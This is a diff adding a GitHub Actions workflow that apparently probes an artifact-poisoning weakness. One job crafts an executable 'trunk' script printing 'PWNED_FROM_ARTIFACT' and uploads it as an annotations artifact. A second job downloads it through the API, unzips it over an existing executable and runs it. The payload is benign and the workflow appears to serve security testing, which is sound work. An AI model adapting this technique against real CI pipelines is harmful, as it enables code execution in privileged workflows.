@@ -1,0 +1,40 @@
+name: gab-artifact-exec-probe
+on: workflow_dispatch
+permissions: read-all
+jobs:
+  produce:
+    runs-on: ubuntu-latest
+    steps:
+      - name: craft
+        run: |
+          mkdir -p payload
+          printf '#!/bin/sh\necho PWNED_FROM_ARTIFACT\n' > payload/trunk
+          chmod 755 payload/trunk
+          ls -l payload/trunk
+      - uses: actions/upload-artifact@v4
+        with:
+          name: trunk-annotations
+          path: payload/trunk
+  consume:
+    needs: produce
+    runs-on: ubuntu-latest
+    permissions:
+      checks: write
+    steps:
+      - name: download via api like target
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const fs = require('fs');
+            const tmp = process.env.RUNNER_TEMP + '/tp';
+            fs.mkdirSync(tmp, {recursive: true});
+            fs.writeFileSync(tmp + '/trunk', 'old', {mode: 0o755});
+            fs.chmodSync(tmp + '/trunk', 0o755);
+            const arts = await github.rest.actions.listWorkflowRunArtifacts({owner: context.repo.owner, repo: context.repo.repo, run_id: context.runId});
+            const a = arts.data.artifacts.filter(x => x.name === 'trunk-annotations')[0];
+            console.log('ARTIFACT_ID=' + (a && a.id));
+            const d = await github.rest.actions.downloadArtifact({owner: context.repo.owner, repo: context.repo.repo, artifact_id: a.id, archive_format: 'zip'});
+            fs.writeFileSync(tmp + '/annotations.zip', Buffer.from(d.data));
+      - name: unpack and inspect
+        run: |
+          cd "$RUNNER_TEMP/tp" && unzip -o annotations.zip && ls -l trunk && ./trunk || echo "EXEC_FAILED rc=$?"
